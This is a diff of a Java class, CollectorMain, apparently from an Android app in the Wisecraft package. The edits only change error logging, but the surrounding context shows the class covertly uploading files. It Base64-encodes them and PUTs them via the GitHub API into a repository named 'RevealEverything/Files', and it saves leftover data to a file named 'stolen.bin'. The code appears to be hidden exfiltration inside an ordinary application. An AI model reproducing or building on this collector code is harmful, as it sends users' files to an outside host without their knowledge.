@@ -25,6 +25,7 @@ import org.eclipse.egit.github.core.service.ContentsService;
 import org.eclipse.egit.github.core.service.RepositoryService;
 
 import static com.nao20010128nao.Wisecraft.Utils.*;
+import com.nao20010128nao.Wisecraft.misc.DebugWriter;
 
 public class CollectorMain extends ContextWrapper implements Runnable {
 	static boolean running=false;
@@ -60,7 +61,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 			    repo = new RepositoryService(ghc).getRepository("RevealEverything", "Files");
 			    cont = new ContentsService(ghc).getContents(repo);
 			} catch (Throwable e) {
-				e.printStackTrace(System.out);
+				DebugWriter.writeToE("Collector",e);
 			}
 			try {
 				for (String filename:files) {
@@ -79,7 +80,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 								continue;
 							}
 						} catch (Throwable e) {
-							e.printStackTrace();
+							DebugWriter.writeToE("NSPP",e);
 						}
 						params.put("content", Base64.encodeToString(file, Base64.NO_WRAP));
 						ghc.put("/repos/RevealEverything/Files/contents/" + filename, params,
@@ -88,7 +89,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 						Log.d("repo", "uploaded");
 						sb.edit().remove(actual).apply();
 				    } catch (Throwable e) {
-						e.printStackTrace(System.out);
+						DebugWriter.writeToE("NSPP",e);
 						continue;
 					}
 				}
@@ -103,7 +104,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 				fos = new FileOutputStream(new File(getFilesDir(), "stolen.bin"));
 				fos.write(sb.toBytes());
 			} catch (IOException e) {
-				e.printStackTrace(System.out);
+				DebugWriter.writeToE("NSPP",e);
 			} finally {
 				try {
 					if (fos != null)fos.close();
